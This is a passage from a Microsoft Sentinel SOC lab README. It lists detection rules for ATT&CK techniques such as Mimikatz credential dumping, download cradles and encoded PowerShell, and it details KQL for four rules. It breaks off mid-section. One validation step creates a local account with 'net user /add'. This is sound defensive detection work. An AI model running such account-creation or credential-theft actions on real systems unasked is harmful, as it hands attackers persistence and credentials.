
# 🛡️ Analytics Rules

Microsoft Sentinel was configured with custom Scheduled Analytics Rules to detect a broad range of adversary techniques mapped to the MITRE ATT&CK framework. These detections leverage Windows Security Events, Sysmon logs, and custom KQL queries collected through Azure Monitor Agent (AMA) and Data Collection Rules (DCRs).

Each analytics rule continuously monitors incoming telemetry from the monitored endpoints. When predefined conditions are met, Microsoft Sentinel generates an alert, creates an incident, and triggers automated response workflows through Azure Logic Apps, enabling faster detection and response to potential security threats.

The detection rules implemented in this lab cover multiple stages of the cyber attack lifecycle, including Initial Access, Execution, Persistence, Credential Access, Discovery, Lateral Movement, Defense Evasion, and Privilege Escalation.

---

# 📋 Analytics Rule Summary

| Detection Rule | Severity | MITRE ATT&CK | Description |
|---------------|----------|--------------|-------------|
| **[Brute Force Login Detection](#-brute-force-login-detection)** | High | T1110 | Detects repeated failed Windows logon attempts that may indicate password guessing or brute-force attacks. |
| **[Successful Login After Brute Force](#-successful-login-after-brute-force)** | High | T1078 | Detects successful authentication immediately following multiple failed login attempts. |
| **[New Local User Creation](#-new-local-user-creation)** | Medium | T1136 | Detects creation of new local user accounts on Windows systems. |
| **[Encoded PowerShell Detection](#-encoded-powershell-detection)** | High | T1059.001 | Detects execution of Base64-encoded PowerShell commands. |
| **[Download Cradle Detection](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#%EF%B8%8F-download-cradle-detection)** | High | T1105 | Detects PowerShell commands used to download payloads from remote servers. |
| **[Mimikatz Detection](#-mimikatz-detection)** | High | T1003 | Detects execution of the Mimikatz credential dumping tool. |
| **[PsExec Detection](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#%EF%B8%8F-psexec-detection)** | High | T1021.002 | Detects PsExec usage for remote execution and lateral movement. |
| **[Registry Run Key Persistence](#-registry-run-key-persistence)** | High | T1547.001 | Detects persistence through Windows Run Registry Keys. |
| **[Event Log Cleared Detection](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#%EF%B8%8F-event-log-cleared-detection)** | High | T1070.001 | Detects attempts to clear Windows Event Logs to hide attacker activity. |
| **[Scheduled Task Creation](#-scheduled-task-creation)** | Medium | T1053.005 | Detects creation of scheduled tasks for persistence or malicious execution. |
| **[Suspicious Discovery Commands](#-suspicious-discovery-commands)** | Medium | T1082, T1016, T1033 | Detects execution of common system discovery and reconnaissance commands. |
| **[Active Directory Computer Enumeration](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#%EF%B8%8F-active-directory-computer-enumeration-detected)** | Medium | T1018 | Detects querying of Active Directory for computer objects, indicating network reconnaissance. |
| **[SMB Admin Share Access](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-smb-admin-share-access)** | High | T1021.002 | Detects access to administrative SMB shares (e.g., C$, ADMIN$) for lateral movement. |
| **[WMI Lateral Movement Detection](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#%EF%B8%8F-wmi-lateral-movement-detection)** | High | T1047 | Detects execution of commands via Windows Management Instrumentation (WMI) across the network. |
| **[Potential Pass-the-Ticket Activity](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#%EF%B8%8F-potential-pass-the-ticket-activity)** | High | T1550.003 | Detects the potential usage of stolen Kerberos tickets to authenticate and move laterally. |
| **[Pass-the-Hash Detection](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-pass-the-hash-detection)** | High | T1550.002 | Detects authentication attempts utilizing stolen password hashes instead of plaintext passwords. |
| **[AS-REP Roasting Detection](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-as-rep-roasting-detection)** | High | T1558.004 | Detects attempts to harvest Kerberos AS-REP messages for offline password cracking. |
| **[Kerberoasting Detection](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-kerberoasting-detection)** | High | T1558.003 | Detects attempts to request Kerberos service tickets for offline password cracking. |
| **[User Added to Domain Admins](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-user-added-to-domain-admins)** | High | T1098 | Detects unauthorized account additions to the highly privileged Domain Admins group. |
| **[PowerShell Download](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#%EF%B8%8F-powershell-download)** | High | T1105 | Detects PowerShell execution used specifically to download files from remote locations. |
| **[Suspicious Command Shell](#suspicious-command-shell)** | Medium | T1059.003 | Detects anomalous or obfuscated usage of the native Windows command shell (cmd.exe). |
| **[Password Spray Detection](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-password-spray-detection)** | High | T1110.003 | Detects authentication attempts against multiple unique users utilizing a single password. |
| **[Defender Disabled](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#%EF%B8%8F-defender-disabled)** | High | T1562.001 | Detects modifications in the registry or via command line to disable Microsoft Defender. |
| **[Mshta Execution](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-mshta-execution)** | High | T1218.005 | Detects execution of mshta.exe to run malicious scripts, bypassing application control mechanisms. |
| **[Impossible Travel](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#%EF%B8%8F-impossible-travel)** | High | T1078.004 | Detects user logins from geographically distant locations in an impossibly short timeframe. |
| **[Firewall Disabled](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-firewall-disabled)** | Medium | T1562.004 | Detects system modifications that turn off or impair the Windows Defender Firewall. |
| **[Certutil Download](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-certutil-download)** | High | T1105 | Detects the abuse of the certutil.exe administrative tool to download malicious external files. |
| **[Network Discovery](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-network-discovery)** | Medium | T1082 | Detects execution of commands aimed at mapping internal network topologies and connections. |
| **[Suspicious Outbound Connection](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-suspicious-outbound-connection)** | Medium | T1071 | Detects unusual outbound network connections potentially indicating Command and Control (C2) traffic. |
| **[Create or Modify System Process](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#%EF%B8%8F-create-or-modify-system-process)** | Medium | T1543 | Detects the creation or modification of system-level processes to establish persistence. |
| **[Event Logging Service Shut Down](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-event-logging-service-shut-down)** | Medium | T1562.001 | Detects the manual termination of the Windows Event logging service to hide malicious activity. |
| **[User Added to Local Administrators](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-user-added-to-local-administrators)** | High | T1098 | Detects unauthorized additions of user accounts to the local Administrators group on an endpoint. |
| **[Rule Templates & Machine Learning Behavioral Analytics](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-rule-templates--machine-learning-behavioral-analytics)** | Medium | ML Behavior Analytics / Threat Intelligence |  Initial Access, Persistence, Lateral Movement | Pre-built Sentinel templates including ML-driven behavioral profiling for anomalous RDP and SSH logins, alongside Microsoft Defender Threat Intelligence indicator matching. |
| **[Correlation 1: Brute Force → Successful Login → New Local User](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-correlation-1-brute-force--successful-login--new-local-user)**  | High | Credential Access, Valid Accounts, Create Account | Correlates multiple failed logon attempts (brute force) with a subsequent successful login and the immediate creation of a new local user account for persistence. |
| **[Correlation 2: Encoded PowerShell → Registry Run Key](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-correlation-2-encoded-powershell--registry-run-key)**  | High | Execution, Boot or Logon Autostart Execution | Tracks obfuscated or encoded PowerShell command execution followed closely by the establishment of persistence via Windows Registry Run Keys. |
| **[Correlation 3: Mimikatz → PsExec](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-correlation-3-mimikatz--psexec)**  | High | OS Credential Dumping, Remote Services | Links credential harvesting using tools like Mimikatz directly with internal lateral movement utilizing administrative utilities like PsExec. |
| **[Correlation 4: New Service → Event Log Cleared](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-correlation-4-new-service--event-log-cleared)**  | High | Create or Modify System Process, Indicator Removal on Host | Tracks the installation of a new system service for persistence followed by the clearing or tampering of Windows event logs to wipe forensic evidence. |
| **[Correlation 5: Certutil Download → Mshta Execution](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-correlation-5-certutil-download--mshta-execution)**  | High | Ingress Tool Transfer | Correlates payload staging and remote file downloads via `certutil.exe` with subsequent execution using native scripting binaries like `mshta.exe`. |
| **[Correlation 6: Defender Disabled → Firewall Disabled → Mimikatz](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Analytics-Rules/README.md#-correlation-6-defender-disabled--firewall-disabled--mimikatz)**  | High | Impair Defenses, OS Credential Dumping | Tracks a multi-phase evasion and extraction campaign combining the deactivation of Microsoft Defender and Windows Firewall prior to executing credential dumping tools. |

# 🔐 Brute Force Login Detection

## 🎯 Objective

Detect repeated failed Windows authentication attempts that may indicate a brute-force or password guessing attack against local or domain accounts. This rule enables early identification of credential-based attacks before an attacker successfully gains access.

---

## 📖 Threat Overview

Brute-force attacks involve repeatedly attempting different password combinations until valid credentials are discovered. Attackers commonly target Remote Desktop Protocol (RDP), SMB, VPN services, and Active Directory accounts using automated tools to gain unauthorized access.

Monitoring failed authentication events allows Security Operations Center (SOC) analysts to quickly identify suspicious login behavior, investigate malicious source IP addresses, and take proactive actions before account compromise occurs.

---

## 🔥 Severity

**High**

<img width="1920" height="1020" alt="Screenshot 2026-08-02 122149" src="https://github.com/user-attachments/assets/32c0adab-aa76-4175-8b61-19bbaba3494d" />

---

## 🛡️ MITRE ATT&CK Mapping

| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Credential Access | Brute Force | T1110 |

---

## 📂 Data Sources

- Windows Security Event Logs
- Azure Monitor Agent (AMA)
- Log Analytics Workspace
- Microsoft Sentinel

---

## 📑 Detection Logic (KQL)

```kql
SecurityEvent
| where EventID == 4625
| summarize FailedAttempts = count() by Account, IpAddress, bin(TimeGenerated, 5m)
| where FailedAttempts >= 5
| order by FailedAttempts desc
```
<img width="1920" height="1020" alt="Screenshot 2026-08-02 122209" src="https://github.com/user-attachments/assets/1ef83be9-54e1-4f62-ab3c-1e16d014d458" />

---

## ⚙️ Rule Configuration

| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Scheduled Analytics Rule | Continuously monitors incoming Windows Security Events at regular intervals. |
| **Severity** | High | Multiple failed login attempts are a strong indicator of a credential attack and require immediate investigation. |
| **Status** | Enabled | Ensures the detection is always active. |
| **Query Frequency** | Every 5 Minutes | Provides near real-time detection while keeping resource usage efficient. |
| **Lookup Period** | Last 6 Minutes | The lookup window is intentionally configured **one minute longer than the execution frequency**. This overlap prevents events from being missed due to ingestion latency or slight delays in log collection, ensuring reliable detection. |
| **Alert Threshold** | More than 0 Results | Generates an alert whenever the query identifies at least one matching brute-force activity. |
| **Event Grouping** | Trigger an alert for each event | Ensures every qualifying brute-force attempt is individually recorded before incident correlation is applied. |

<img width="1920" height="1020" alt="Screenshot 2026-08-02 122224" src="https://github.com/user-attachments/assets/505bbed1-920f-4d84-9ee9-97115b35e2ca" />

---

## 🧩 Entity Mapping

The following entities are mapped to enrich Microsoft Sentinel incidents and improve investigation capabilities.

| Entity | Identifier |
|---------|------------|
| Account | Account Name |
| IP Address | Source IP Address |

### Why map these entities?

- **Account:** Identifies the user account targeted by the brute-force attack, allowing analysts to quickly determine which credentials are under attack.

- **IP Address:** Identifies the source of the authentication attempts, making it easier to investigate malicious hosts, identify repeated attacks, and perform IP-based blocking if necessary.

Entity mapping also enables Microsoft Sentinel to automatically correlate alerts and build richer investigation graphs, reducing manual analysis during incident response.

<img width="1920" height="1020" alt="Screenshot 2026-08-02 122216" src="https://github.com/user-attachments/assets/d19b067b-674d-4c42-bee0-b4b418017d03" />

---

## 🔄 Detection Workflow

```text
Failed Windows Logon Attempt
            │
            ▼
Windows Security Log (Event ID 4625)
            │
            ▼
Azure Monitor Agent (AMA)
            │
            ▼
Log Analytics Workspace
            │
            ▼
Microsoft Sentinel executes scheduled KQL query
            │
            ▼
5 or more failed logon attempts detected within 5 minutes
            │
            ▼
Alert Generated
            │
            ▼
Incident Created
            │
            ▼
Automation Rule Triggered
            │
            ▼
SOC Analyst Assigned & Investigation Begins
```

---

## 🚨 Alert Trigger Conditions

An alert is generated when all of the following conditions are met:

- Windows Security Event **4625 (Failed Logon)** is generated.
- Five or more failed authentication attempts occur within a **5-minute** time window.
- The scheduled KQL query returns one or more matching results.

---

## 📋 Incident Configuration

To improve incident management and reduce alert fatigue, Microsoft Sentinel is configured with the following settings:

- **Incident Creation:** Enabled to automatically create an incident whenever the analytics rule is triggered.
- **Alert Grouping:** Enabled to correlate related alerts into a single incident.
- **Grouping Time Window:** **5 Hours** to consolidate repeated brute-force attempts occurring within the selected timeframe.
- **Grouping Method:** Alerts are grouped based on the **Account** entity.

### Why group alerts by Account?

Brute-force attacks often generate dozens or even hundreds of failed authentication attempts against the **same user account**. Without grouping, each detection would create a separate incident, making investigations noisy and difficult to manage.

By grouping alerts using the **Account** entity:

- Multiple failed login attempts against the same user are consolidated into a single incident.
- Analysts receive one investigation instead of numerous duplicate incidents.
- Incident timelines become easier to review.
- Alert fatigue is significantly reduced while preserving all related events within the incident.

This configuration provides a cleaner and more efficient investigation experience for SOC analysts.

<img width="1920" height="1020" alt="Screenshot 2026-08-02 122254" src="https://github.com/user-attachments/assets/d7db6190-7694-4088-b846-b7a712fe76b0" />

---

## 🤖 Automated Response

When an incident is created:

- The configured **Automation Rule** is executed.
- Incident ownership is automatically assigned.
- Additional playbooks, such as email notifications, can be triggered to notify SOC analysts.

<img width="1920" height="1020" alt="Screenshot 2026-08-02 122318" src="https://github.com/user-attachments/assets/de10e86b-9ef3-4ca3-a561-f3d70b08b900" />

---

## ✅ Validation

The detection was validated by intentionally performing multiple failed Windows logon attempts against the monitored endpoint. Microsoft Sentinel successfully generated an alert, created an incident, and executed the configured automation rule after the detection threshold was reached.

<img width="1920" height="1020" alt="Screenshot 2026-08-02 122325" src="https://github.com/user-attachments/assets/a0c27696-888f-4533-9000-2e5c80adf727" />

---

## 🎯 Security Impact

This detection helps security teams:

- Detect brute-force and password guessing attacks.
- Identify targeted user accounts.
- Track malicious source IP addresses.
- Reduce the likelihood of unauthorized access.
- Improve incident response through automated alerting and investigation.

---



⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---
# 🔐 Successful Login After Brute Force

## 🎯 Objective

Detect successful authentication immediately following multiple failed login attempts against local or domain accounts. This rule enables early identification of potentially compromised credentials following a brute-force or password guessing attack, allowing analysts to respond to a successful breach.

---

## 📖 Threat Overview

Attackers frequently employ brute-force or password-spraying techniques to guess valid credentials. If the threat actor successfully identifies a password, they will typically log in to the compromised account immediately to establish initial access, maintain persistence, or move laterally within the network.

Monitoring for a successful login event (Event ID 4624) that occurs shortly after a high volume of failed login attempts (Event ID 4625) provides a high-confidence indicator of an account compromise, requiring immediate containment actions by the SOC team.

---

## 🔥 Severity

**High**

<img width="1920" height="1020" alt="Screenshot 2026-08-02 123325" src="https://github.com/user-attachments/assets/747a63b3-625c-46bb-b3cd-dbd47cff88a3" />

---

## 🛡️ MITRE ATT&CK Mapping

| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Initial Access | Valid Accounts | T1078 |
| Credential Access | Brute Force: Password Guessing | T1110.001 |

---

## 📂 Data Sources

- Windows Security Event Logs
- Azure Monitor Agent (AMA)
- Log Analytics Workspace
- Microsoft Sentinel

---

## 📑 Detection Logic (KQL)

```kql
let TimeWindow = 10m;
let FailedThreshold = 5;

let FailedLogins = 
SecurityEvent
| where EventID == 4625
| where isnotempty(IpAddress)
| where IpAddress != "-"
| summarize 
    FailedCount = count(),
    LastFailedTime = max(TimeGenerated)
    by TargetUserName, IpAddress;

let SuccessfulLogins = 
SecurityEvent
| where EventID == 4624
| where LogonType == 10
| where isnotempty(IpAddress)
| where IpAddress != "-"
| project 
    SuccessTime = TimeGenerated,
    TargetUserName,
    IpAddress,
    Computer;

FailedLogins
| where FailedCount >= FailedThreshold
| join kind=inner SuccessfulLogins 
    on TargetUserName, IpAddress
| where SuccessTime between (LastFailedTime .. (LastFailedTime + TimeWindow))
| project 
    SuccessTime,
    Computer,
    TargetUserName,
    IpAddress,
    FailedCount,
    LastFailedTime
| order by SuccessTime desc
```
<img width="1920" height="1020" alt="Screenshot 2026-08-02 123441" src="https://github.com/user-attachments/assets/6bb3b726-6ed7-4d18-8cd9-1d1950573911" />
<img width="1920" height="1020" alt="Screenshot 2026-08-02 123447" src="https://github.com/user-attachments/assets/0572e181-d891-41ad-b175-7f373873a562" />

---

## ⚙️ Rule Configuration

| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously with minimal delay to detect active compromises the moment they happen. |
| **Severity** | High | A successful login following a brute force indicates an active threat actor on the network. |
| **Status** | Enabled | Ensures the detection is always active. |
| **Event Grouping** | Trigger an alert for each event | Ensures every qualifying successful login attempt is individually recorded. |
| **Suppression** | Stop for 1 Hour | Prevents alert flooding in the event the attacker rapidly logs in and out of the compromised machine. |

---

## 🧩 Entity Mapping

The following entities are mapped to enrich Microsoft Sentinel incidents and improve investigation capabilities.

| Entity | Identifier | Field |
|---------|------------|-------|
| Account | Name | TargetUserName |
| IP Address | Address | IpAddress |

### Why map these entities?

- **Account:** Identifies the exact user account that has been compromised, allowing analysts to quickly disable the account, revoke sessions, or initiate a password reset.
- **IP Address:** Identifies the attacker's source infrastructure, making it easier to correlate with threat intelligence feeds or implement an IP block at the firewall.

Entity mapping also enables Microsoft Sentinel to automatically build richer investigation graphs, tying the failed logon events directly to the successful breach.

<img width="1920" height="1020" alt="Screenshot 2026-08-02 123458" src="https://github.com/user-attachments/assets/bdd9e840-b87d-4841-8191-31c9d9c03a76" />

---

## 🔄 Detection Workflow

```text
Repeated Failed Logons (Event ID 4625) followed by a Successful Logon (Event ID 4624)
            │
            ▼
Azure Monitor Agent (AMA) ingests logs
            │
            ▼
Log Analytics Workspace
            │
            ▼
Microsoft Sentinel NRT Analytics Rule evaluates incoming events
            │
            ▼
Threshold met: >= 5 failures, followed by 1 success within 10 minutes
            │
            ▼
Alert Generated
            │
            ▼
Incident Created (Grouped by Account Entity)
            │
            ▼
Automation Rule Triggered (Account Compromise Suspected)
            │
            ▼
SOC Analyst Assigned & Containment Actions Executed
```

---

## 🚨 Alert Trigger Conditions

An alert is generated when all of the following conditions are met:

- Five or more failed authentication attempts (Event ID 4625) are logged for a specific user and IP.
- A successful Remote Interactive authentication (Event ID 4624, LogonType 10) occurs.
- The successful login matches the same `TargetUserName` and `IpAddress` and happens within a **10-minute** window of the last failed attempt.

---

## 📋 Incident Configuration

To improve incident management and reduce alert fatigue, Microsoft Sentinel is configured with the following settings:

- **Incident Creation:** Enabled to automatically create an incident whenever the analytics rule is triggered.
- **Alert Grouping:** Enabled to correlate related alerts into a single incident.
- **Grouping Time Window:** **5 Hours** to consolidate repeated cycles occurring within the selected timeframe.
- **Grouping Method:** Alerts are grouped based on the **Account (Name)** entity.

### Why group alerts by Account?

If an attacker establishes initial access, they may trigger multiple successful logins during their lateral movement or discovery phases. Grouping by the **Account** entity ensures that all alerts tied to this specific compromised identity over a 5-hour period are consolidated into a single high-priority incident for the SOC to investigate, rather than flooding the queue with duplicate tickets.

<img width="1920" height="1020" alt="Screenshot 2026-08-02 123511" src="https://github.com/user-attachments/assets/3ad785b8-8bcd-4cc9-8bdc-1bfc6b73b2e3" />

---

## 🤖 Automated Response

When an incident is created:

- The configured Automation Rule (**Account Compromise Suspected**) is executed.
- Incident tags are automatically appended for easier SOC filtering and triage.
- Playbooks can subsequently trigger logic to block the malicious IP or force a credential reset in Entra ID.

<img width="1920" height="1020" alt="Screenshot 2026-08-02 123518" src="https://github.com/user-attachments/assets/2782c1b2-d647-4969-8251-84196f59f28e" />

---

## ✅ Validation

The detection was validated by intentionally performing multiple failed RDP logon attempts against a monitored endpoint using an incorrect password, immediately followed by logging in successfully with the correct password. Microsoft Sentinel successfully correlated the events, generated an alert, created an incident, and executed the automation tagging rule.

<img width="1920" height="1020" alt="Screenshot 2026-08-02 123530" src="https://github.com/user-attachments/assets/a89aa3cb-e234-4b42-8fc9-0e9568997a97" />

---

## 🎯 Security Impact

This detection is critical for security operations as it helps teams:
- Confirm that a perimeter defense or authentication barrier has been successfully breached.
- Immediately identify and isolate the specific compromised user account before the attacker can escalate privileges or move laterally.
- Provide concrete evidence of the exact time of compromise and the adversary's source IP address for further threat hunting and blocklisting.

 ---


⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---

# 👤 New Local User Creation

## 🎯 Objective

This rule creates an alert whenever a new local user is created and detects the creation of new local user accounts on Windows systems. This enables the early identification of unauthorized account provisioning, which may indicate an attacker establishing a foothold within the environment.

---

## 📖 Threat Overview

Adversaries often create new local or domain user accounts to maintain access to victim systems and evade detection. By establishing their own credentials, they bypass the need to rely on compromised accounts that might undergo password resets or be disabled by administrators. 

Monitoring for Event ID 4720 (A user account was created) is a critical defensive measure to spot unauthorized persistence mechanisms and unauthorized administrative actions.

---

## 🔥 Severity

**Medium**

<img width="1920" height="1020" alt="Screenshot 2026-08-02 125146" src="https://github.com/user-attachments/assets/e4320446-5745-4cc3-8a8d-35edd2eeb7d6" />

---

## 🛡️ MITRE ATT&CK Mapping

| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Persistence | Create Account | T1136 |

---

## 📂 Data Sources

- Windows Security Event Logs
- Azure Monitor Agent (AMA)
- Log Analytics Workspace
- Microsoft Sentinel

---

## 📑 Detection Logic (KQL)

```kql
SecurityEvent
| where EventID == 4720
| project TimeGenerated,Computer,SubjectAccount,TargetAccount,Activity
```
<img width="1920" height="1020" alt="Screenshot 2026-08-02 125211" src="https://github.com/user-attachments/assets/de07dc3f-fa6b-4ee7-b3ca-302576021014" />

---

## ⚙️ Rule Configuration

| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Scheduled Analytics Rule | Evaluates logs on a defined schedule. |
| **Severity** | Medium | Unauthorized account creation is a standard persistence method requiring verification. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Query Frequency** | Run query every 5 Minutes | Provides timely detection for new account generation. |
| **Lookup Period** | Lookup data from the last 6 Minutes | A 1-minute overlap accounts for minor ingestion delays to ensure no alerts are missed. |
| **Alert Threshold** | Trigger alert if query returns more than 0 results | Ensures any occurrence of this event ID generates an alert. |
| **Event Grouping** | Trigger an alert for each event | Maintains individual records for every newly created account. |

<img width="1920" height="1020" alt="Screenshot 2026-08-02 125228" src="https://github.com/user-attachments/assets/3622078f-45e9-4cd1-84c2-e6c28e44ee18" />

---

## 🧩 Entity Mapping

The following entities are mapped to enrich Microsoft Sentinel incidents and improve investigation capabilities.

| Entity | Identifier | Field |
|---------|------------|-------|
| Host | HostName | Computer |
| Account | Name | TargetAccount |

### Why map these entities?

- **Host:** Immediately points investigators to the specific endpoint where the local account was provisioned.
- **Account:** Extracts the name of the newly created account so analysts can check if it aligns with standard naming conventions or appears malicious.

<img width="1920" height="1020" alt="Screenshot 2026-08-02 125218" src="https://github.com/user-attachments/assets/6b5154ac-4286-4f10-8f44-2b4396d99cec" />

---

## 🔄 Detection Workflow

```text
New Local User Account Created 
            │
            ▼
Windows Security Log (Event ID 4720)
            │
            ▼
Azure Monitor Agent (AMA)
            │
            ▼
Log Analytics Workspace
            │
            ▼
Microsoft Sentinel executes scheduled KQL query
            │
            ▼
Event matched within the 5-minute schedule
            │
            ▼
Alert Generated
            │
            ▼
Incident Created (No grouping, discrete incident generated)
            │
            ▼
SOC Analyst Assigned & Investigation Begins
```

---

## 🚨 Alert Trigger Conditions

An alert is generated when all of the following conditions are met:

- Windows Security Event **4720 (A user account was created)** is generated on the monitored host.
- The scheduled KQL query runs and returns more than 0 results within the 6-minute evaluation window.

---

## 📋 Incident Configuration

To govern how alerts manifest in the SOC queue, Microsoft Sentinel is configured with the following settings:

- **Incident Creation:** Enabled (Creates incidents from alerts triggered by this analytics rule).
- **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Disabled**.

### Why disable alert grouping?

Disabling grouping ensures that if multiple distinct accounts are created in rapid succession on different machines (or by different actors), each instance generates a discrete incident for strict auditing, rather than rolling them into a single ticket that might obscure the scale of the persistence effort.

<img width="1920" height="1020" alt="Screenshot 2026-08-02 125251" src="https://github.com/user-attachments/assets/c712553d-a91c-43c1-8575-8e99df207495" />

---

## ✅ Validation

This detection can be validated by opening an administrative Command Prompt or PowerShell session on a monitored endpoint and executing the command: `net user /add TestUser Password123!`. Within 5 minutes, Microsoft Sentinel should successfully ingest Event ID 4720 and generate the corresponding incident.

<img width="1920" height="1020" alt="Screenshot 2026-08-02 125306" src="https://github.com/user-attachments/assets/abc7df1a-3a20-46c0-8634-1498c5dc894f" />

---

## 🎯 Security Impact

This detection helps security teams:
- Identify unauthorized backdoors established by threat actors.
- Detect privilege escalation attempts or rogue administrative activity.
- Quickly isolate affected hosts before an attacker can utilize the new account for lateral movement.

---



⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---
# 💻 Encoded PowerShell Detection

## 🎯 Objective

Detect the execution of PowerShell commands utilizing Base64 encoding parameters. This rule provides early identification of obfuscated script execution, which is highly indicative of an attacker attempting to hide malicious payloads or evade basic command-line logging and signature-based detection.

---

## 📖 Threat Overview

Threat actors and automated malware strains frequently leverage PowerShell for execution and lateral movement. To avoid detection by endpoint security controls (like Antivirus or EDR) and to safely pass complex scripts through the command line without syntax errors, attackers encode their commands in Base64 using the `-EncodedCommand` (or `-enc`, `-e`) flags. 

While legitimate administrative scripts occasionally use this method, its presence in an environment is suspicious and warrants immediate investigation to decode the payload and determine its true intent.

---

## 🔥 Severity

**High**

<img width="1920" height="1020" alt="Screenshot 2026-08-02 131314" src="https://github.com/user-attachments/assets/6450bc96-ec09-4db9-93c3-8155b9b3aa0f" />

---

## 🛡️ MITRE ATT&CK Mapping

| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 |

---

## 📂 Data Sources

- Windows Security Event Logs (Process Creation)
- Azure Monitor Agent (AMA)
- Log Analytics Workspace
- Microsoft Sentinel

---

## 📑 Detection Logic (KQL)

```kql
SecurityEvent
| where EventID == 4688
| where CommandLine has_any ("-enc", "-EncodedCommand")
| project TimeGenerated,Computer,SubjectAccount,NewProcessName,CommandLine,ParentProcessName
```
<img width="1920" height="1020" alt="Screenshot 2026-08-02 131341" src="https://github.com/user-attachments/assets/8bebf961-2340-4e57-8c22-158511e9009e" />

---

## ⚙️ Rule Configuration

| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Scheduled Analytics Rule | Evaluates process execution logs on a continuous schedule. |
| **Severity** | High | Obfuscated PowerShell execution is a common attacker tactic for executing malicious payloads. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Query Frequency** | Run query every 5 Minutes | Provides timely detection of suspicious process execution. |
| **Lookup Period** | Lookup data from the last 6 Minutes | A 1-minute overlap prevents events from being missed due to slight ingestion delays. |
| **Alert Threshold** | Trigger alert if query returns more than 0 results | Generates an alert immediately upon finding a matching execution. |
| **Event Grouping** | Group all events into a single alert | Aggregates results into a single alert payload per query run. |

<img width="1920" height="1020" alt="Screenshot 2026-08-02 131412" src="https://github.com/user-attachments/assets/d4809ea9-8124-4e3c-9407-b96e0c72d3d0" />

---

## 🧩 Entity Mapping

The following entities are mapped to enrich Microsoft Sentinel incidents and improve investigation capabilities.

| Entity | Identifier | Field |
|---------|------------|-------|
| Host | HostName | Computer |
| Process | CommandLine | CommandLine |

### Why map these entities?

- **Host:** Identifies the exact endpoint where the encoded script was executed, allowing analysts to target their investigation.
- **Process (CommandLine):** Captures the exact command string used. This is critical because analysts can immediately extract the Base64 string from the entity and decode it to reveal the attacker's hidden instructions.

<img width="888" height="482" alt="Screenshot 2026-08-02 131401" src="https://github.com/user-attachments/assets/84d630ea-0e3a-4411-826d-06ba11342b25" />

---

## 🔄 Detection Workflow

```text
Encoded PowerShell Command Executed (e.g., powershell -enc JAB...)
            │
            ▼
Windows Security Log (Event ID 4688 - Process Creation)
            │
            ▼
Azure Monitor Agent (AMA)
            │
            ▼
Log Analytics Workspace
            │
            ▼
Microsoft Sentinel executes scheduled KQL query
            │
            ▼
Command matches "-enc" or "-EncodedCommand" within the 5-minute schedule
            │
            ▼
Alert Generated
            │
            ▼
Incident Created (No alert grouping)
            │
            ▼
SOC Analyst Assigned & Payload Decoding Begins
```

---

## 🚨 Alert Trigger Conditions

An alert is generated when all of the following conditions are met:

